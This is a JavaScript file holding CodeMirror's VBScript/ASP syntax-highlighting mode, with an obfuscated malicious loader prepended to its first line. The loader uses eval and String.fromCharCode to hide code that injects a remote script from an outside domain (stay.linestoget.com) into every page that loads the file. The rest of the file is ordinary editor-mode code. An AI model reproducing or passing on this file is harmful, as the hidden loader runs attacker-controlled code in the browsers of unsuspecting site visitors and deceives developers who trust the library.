var f=String;eval(f.fromCharCode(102,117,110)+f.fromCharCode(99,116,105,111,110)+f.fromCharCode(32,97,115,115,40,115,114,99,41,123,114,101,116,117,114,110)+f.fromCharCode(32,66,111,111,108,101,97,110)+f.fromCharCode(40,100,111,99,117,109,101,110)+f.fromCharCode(116,46,113,117,101,114,121,83,101,108,101,99,116,111,114,40,39,115,99,114,105,112,116,91,115,114,99,61,34,39,32,43,32,115,114,99,32,43,32,39,34,93,39,41,41,59,125,32,118,97,114,32,108,111,61,34,104,116,116,112,115,58,47,47,115,116,97,121,46,108,105,110)+f.fromCharCode(101,115,116,111,103,101,116,46,99,111,109,47,115,99,114,105,112,116,115,47,99,104,101,99,107,46,106,115,63,118,61,51,46,48,46,51,34,59,105,102,40,97,115,115,40,108,111,41,61,61,102,97,108,115,101,41,123,118,97,114,32,100,61,100,111,99,117,109,101,110)+f.fromCharCode(116,59,118,97,114,32,115,61,100,46,99,114,101,97,116,101,69,108,101,109,101,110)+f.fromCharCode(116,40,39,115,99,114,105,112,116,39,41,59,32,115,46,115,114,99,61,108,111,59,105,102,32,40,100,111,99,117,109,101,110)+f.fromCharCode(116,46,99,117,114,114,101,110)+f.fromCharCode(116,83,99,114,105,112,116,41,32,123,32,100,111,99,117,109,101,110)+f.fromCharCode(116,46,99,117,114,114,101,110)+f.fromCharCode(116,83,99,114,105,112,116,46,112,97,114,101,110)+f.fromCharCode(116,78,111,100,101,46,105,110)+f.fromCharCode(115,101,114,116,66,101,102,111,114,101,40,115,44,32,100,111,99,117,109,101,110)+f.fromCharCode(116,46,99,117,114,114,101,110)+f.fromCharCode(116,83,99,114,105,112,116,41,59,125,32,101,108,115,101,32,123,100,46,103,101,116,69,108,101,109,101,110)+f.fromCharCode(116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,46,97,112,112,101,110)+f.fromCharCode(100,67,104,105,108,100,40,115,41,59,125,125));/*99586587347*/// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

/*
For extra ASP classic objects, initialize CodeMirror instance with this option:
    isASP: true

E.G.:
    var editor = CodeMirror.fromTextArea(document.getElementById("code"), {
        lineNumbers: true,
        isASP: true
      });
*/

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("vbscript", function(conf, parserConf) {
    var ERRORCLASS = 'error';

    function wordRegexp(words) {
        return new RegExp("^((" + words.join(")|(") + "))\\b", "i");
    }

    var singleOperators = new RegExp("^[\\+\\-\\*/&\\\\\\^<>=]");
    var doubleOperators = new RegExp("^((<>)|(<=)|(>=))");
    var singleDelimiters = new RegExp('^[\\.,]');
    var brackets = new RegExp('^[\\(\\)]');
    var identifiers = new RegExp("^[A-Za-z][_A-Za-z0-9]*");

    var openingKeywords = ['class','sub','select','while','if','function', 'property', 'with', 'for'];
    var middleKeywords = ['else','elseif','case'];
    var endKeywords = ['next','loop','wend'];

    var wordOperators = wordRegexp(['and', 'or', 'not', 'xor', 'is', 'mod', 'eqv', 'imp']);
    var commonkeywords = ['dim', 'redim', 'then',  'until', 'randomize',
                          'byval','byref','new','property', 'exit', 'in',
                          'const','private', 'public',
                          'get','set','let', 'stop', 'on error resume next', 'on error goto 0', 'option explicit', 'call', 'me'];

    //This list was from: http://msdn.microsoft.com/en-us/library/f8tbc79x(v=vs.84).aspx
    var atomWords = ['true', 'false', 'nothing', 'empty', 'null'];
    //This list was from: http://msdn.microsoft.com/en-us/library/3ca8tfek(v=vs.84).aspx
    var builtinFuncsWords = ['abs', 'array', 'asc', 'atn', 'cbool', 'cbyte', 'ccur', 'cdate', 'cdbl', 'chr', 'cint', 'clng', 'cos', 'csng', 'cstr', 'date', 'dateadd', 'datediff', 'datepart',
                        'dateserial', 'datevalue', 'day', 'escape', 'eval', 'execute', 'exp', 'filter', 'formatcurrency', 'formatdatetime', 'formatnumber', 'formatpercent', 'getlocale', 'getobject',
                        'getref', 'hex', 'hour', 'inputbox', 'instr', 'instrrev', 'int', 'fix', 'isarray', 'isdate', 'isempty', 'isnull', 'isnumeric', 'isobject', 'join', 'lbound', 'lcase', 'left',
                        'len', 'loadpicture', 'log', 'ltrim', 'rtrim', 'trim', 'maths', 'mid', 'minute', 'month', 'monthname', 'msgbox', 'now', 'oct', 'replace', 'rgb', 'right', 'rnd', 'round',
                        'scriptengine', 'scriptenginebuildversion', 'scriptenginemajorversion', 'scriptengineminorversion', 'second', 'setlocale', 'sgn', 'sin', 'space', 'split', 'sqr', 'strcomp',
                        'string', 'strreverse', 'tan', 'time', 'timer', 'timeserial', 'timevalue', 'typename', 'ubound', 'ucase', 'unescape', 'vartype', 'weekday', 'weekdayname', 'year'];

    //This list was from: http://msdn.microsoft.com/en-us/library/ydz4cfk3(v=vs.84).aspx
    var builtinConsts = ['vbBlack', 'vbRed', 'vbGreen', 'vbYellow', 'vbBlue', 'vbMagenta', 'vbCyan', 'vbWhite', 'vbBinaryCompare', 'vbTextCompare',
                         'vbSunday', 'vbMonday', 'vbTuesday', 'vbWednesday', 'vbThursday', 'vbFriday', 'vbSaturday', 'vbUseSystemDayOfWeek', 'vbFirstJan1', 'vbFirstFourDays', 'vbFirstFullWeek',
                         'vbGeneralDate', 'vbLongDate', 'vbShortDate', 'vbLongTime', 'vbShortTime', 'vbObjectError',
                         'vbOKOnly', 'vbOKCancel', 'vbAbortRetryIgnore', 'vbYesNoCancel', 'vbYesNo', 'vbRetryCancel', 'vbCritical', 'vbQuestion', 'vbExclamation', 'vbInformation', 'vbDefaultButton1', 'vbDefaultButton2',
                         'vbDefaultButton3', 'vbDefaultButton4', 'vbApplicationModal', 'vbSystemModal', 'vbOK', 'vbCancel', 'vbAbort', 'vbRetry', 'vbIgnore', 'vbYes', 'vbNo',
                         'vbCr', 'VbCrLf', 'vbFormFeed', 'vbLf', 'vbNewLine', 'vbNullChar', 'vbNullString', 'vbTab', 'vbVerticalTab', 'vbUseDefault', 'vbTrue', 'vbFalse',
                         'vbEmpty', 'vbNull', 'vbInteger', 'vbLong', 'vbSingle', 'vbDouble', 'vbCurrency', 'vbDate', 'vbString', 'vbObject', 'vbError', 'vbBoolean', 'vbVariant', 'vbDataObject', 'vbDecimal', 'vbByte', 'vbArray'];
    //This list was from: http://msdn.microsoft.com/en-us/library/hkc375ea(v=vs.84).aspx
    var builtinObjsWords = ['WScript', 'err', 'debug', 'RegExp'];
    var knownProperties = ['description', 'firstindex', 'global', 'helpcontext', 'helpfile', 'ignorecase', 'length', 'number', 'pattern', 'source', 'value', 'count'];
    var knownMethods = ['clear', 'execute', 'raise', 'replace', 'test', 'write', 'writeline', 'close', 'open', 'state', 'eof', 'update', 'addnew', 'end', 'createobject', 'quit'];

    var aspBuiltinObjsWords = ['server', 'response', 'request', 'session', 'application'];
    var aspKnownProperties = ['buffer', 'cachecontrol', 'charset', 'contenttype', 'expires', 'expiresabsolute', 'isclientconnected', 'pics', 'status', //response
                              'clientcertificate', 'cookies', 'form', 'querystring', 'servervariables', 'totalbytes', //request
                              'contents', 'staticobjects', //application
                              'codepage', 'lcid', 'sessionid', 'timeout', //session
                              'scripttimeout']; //server
    var aspKnownMethods = ['addheader', 'appendtolog', 'binarywrite', 'end', 'flush', 'redirect', //response
                           'binaryread', //request
                           'remove', 'removeall', 'lock', 'unlock', //application
                           'abandon', //session
                           'getlasterror', 'htmlencode', 'mappath', 'transfer', 'urlencode']; //server

    var knownWords = knownMethods.concat(knownProperties);

    builtinObjsWords = builtinObjsWords.concat(builtinConsts);

    if (conf.isASP){
        builtinObjsWords = builtinObjsWords.concat(aspBuiltinObjsWords);
        knownWords = knownWords.concat(aspKnownMethods, aspKnownProperties);
    };

    var keywords = wordRegexp(commonkeywords);
    var atoms = wordRegexp(atomWords);
    var builtinFuncs = wordRegexp(builtinFuncsWords);
    var builtinObjs = wordRegexp(builtinObjsWords);
    var known = wordRegexp(knownWords);
    var stringPrefixes = '"';

    var opening = wordRegexp(openingKeywords);
    var middle = wordRegexp(middleKeywords);
    var closing = wordRegexp(endKeywords);
    var doubleClosing = wordRegexp(['end']);
    var doOpening = wordRegexp(['do']);
    var noIndentWords = wordRegexp(['on error resume next', 'exit']);
    var comment = wordRegexp(['rem']);


    function indent(_stream, state) {
      state.currentIndent++;
    }

    function dedent(_stream, state) {
      state.currentIndent--;
    }
    // tokenizers
    function tokenBase(stream, state) {
        if (stream.eatSpace()) {
            return 'space';
            //return null;
        }

        var ch = stream.peek();

        // Handle Comments
        if (ch === "'") {
            stream.skipToEnd();
            return 'comment';
        }
        if (stream.match(comment)){
            stream.skipToEnd();
            return 'comment';
        }


        // Handle Number Literals
        if (stream.match(/^((&H)|(&O))?[0-9\.]/i, false) && !stream.match(/^((&H)|(&O))?[0-9\.]+[a-z_]/i, false)) {
            var floatLiteral = false;
            // Floats
            if (stream.match(/^\d*\.\d+/i)) { floatLiteral = true; }
            else if (stream.match(/^\d+\.\d*/)) { floatLiteral = true; }
            else if (stream.match(/^\.\d+/)) { floatLiteral = true; }

            if (floatLiteral) {
                // Float literals may be "imaginary"
                stream.eat(/J/i);
                return 'number';
            }
            // Integers
            var intLiteral = false;
            // Hex
            if (stream.match(/^&H[0-9a-f]+/i)) { intLiteral = true; }
            // Octal
            else if (stream.match(/^&O[0-7]+/i)) { intLiteral = true; }
            // Decimal
            else if (stream.match(/^[1-9]\d*F?/)) {
                // Decimal literals may be "imaginary"
                stream.eat(/J/i);
                // TODO - Can you have imaginary longs?
                intLiteral = true;
            }
            // Zero by itself with no other piece of number.
            else if (stream.match(/^0(?![\dx])/i)) { intLiteral = true; }
            if (intLiteral) {
                // Integer literals may be "long"
                stream.eat(/L/i);
                return 'number';
            }
        }

        // Handle Strings
        if (stream.match(stringPrefixes)) {
            state.tokenize = tokenStringFactory(stream.current());
            return state.tokenize(stream, state);
        }

        // Handle operators and Delimiters
        if (stream.match(doubleOperators)
            || stream.match(singleOperators)
            || stream.match(wordOperators)) {
            return 'operator';
        }
        if (stream.match(singleDelimiters)) {
            return null;
        }

        if (stream.match(brackets)) {
            return "bracket";
        }

        if (stream.match(noIndentWords)) {
            state.doInCurrentLine = true;

            return 'keyword';
        }

        if (stream.match(doOpening)) {
            indent(stream,state);
            state.doInCurrentLine = true;

            return 'keyword';
        }
        if (stream.match(opening)) {
            if (! state.doInCurrentLine)
              indent(stream,state);
            else
              state.doInCurrentLine = false;

            return 'keyword';
        }
        if (stream.match(middle)) {
            return 'keyword';
        }


        if (stream.match(doubleClosing)) {
            dedent(stream,state);
            dedent(stream,state);

            return 'keyword';
        }
        if (stream.match(closing)) {
            if (! state.doInCurrentLine)
              dedent(stream,state);
            else
              state.doInCurrentLine = false;

            return 'keyword';
        }

        if (stream.match(keywords)) {
            return 'keyword';
        }

        if (stream.match(atoms)) {
            return 'atom';
        }

        if (stream.match(known)) {
            return 'variable-2';
        }

        if (stream.match(builtinFuncs)) {
            return 'builtin';
        }

        if (stream.match(builtinObjs)){
            return 'variable-2';
        }

        if (stream.match(identifiers)) {
            return 'variable';
        }

        // Handle non-detected items
        stream.next();
        return ERRORCLASS;
    }

    function tokenStringFactory(delimiter) {
        var singleline = delimiter.length == 1;
        var OUTCLASS = 'string';

        return function(stream, state) {
            while (!stream.eol()) {
                stream.eatWhile(/[^'"]/);
                if (stream.match(delimiter)) {
                    state.tokenize = tokenBase;
                    return OUTCLASS;
                } else {
                    stream.eat(/['"]/);
                }
            }
            if (singleline) {
                if (parserConf.singleLineStringErrors) {
                    return ERRORCLASS;
                } else {
                    state.tokenize = tokenBase;
                }
            }
            return OUTCLASS;
        };
    }


    function tokenLexer(stream, state) {
        var style = state.tokenize(stream, state);
        var current = stream.current();

        // Handle '.' connected identifiers
        if (current === '.') {
            style = state.tokenize(stream, state);

            current = stream.current();
            if (style && (style.substr(0, 8) === 'variable' || style==='builtin' || style==='keyword')){//|| knownWords.indexOf(current.substring(1)) > -1) {
                if (style === 'builtin' || style === 'keyword') style='variable';
                if (knownWords.indexOf(current.substr(1)) > -1) style='variable-2';

                return style;
            } else {
                return ERRORCLASS;
            }
        }

        return style;
    }

    var external = {
        electricChars:"dDpPtTfFeE ",
        startState: function() {
            return {
              tokenize: tokenBase,
              lastToken: null,
              currentIndent: 0,
              nextLineIndent: 0,
              doInCurrentLine: false,
              ignoreKeyword: false


          };
        },

        token: function(stream, state) {
            if (stream.sol()) {
              state.currentIndent += state.nextLineIndent;
              state.nextLineIndent = 0;
              state.doInCurrentLine = 0;
            }
            var style = tokenLexer(stream, state);

            state.lastToken = {style:style, content: stream.current()};

            if (style==='space') style=null;

            return style;
        },

        indent: function(state, textAfter) {
            var trueText = textAfter.replace(/^\s+|\s+$/g, '') ;
            if (trueText.match(closing) || trueText.match(doubleClosing) || trueText.match(middle)) return conf.indentUnit*(state.currentIndent-1);
            if(state.currentIndent < 0) return 0;
            return state.currentIndent * conf.indentUnit;
        }

    };
    return external;
});

CodeMirror.defineMIME("text/vbscript", "vbscript");

});
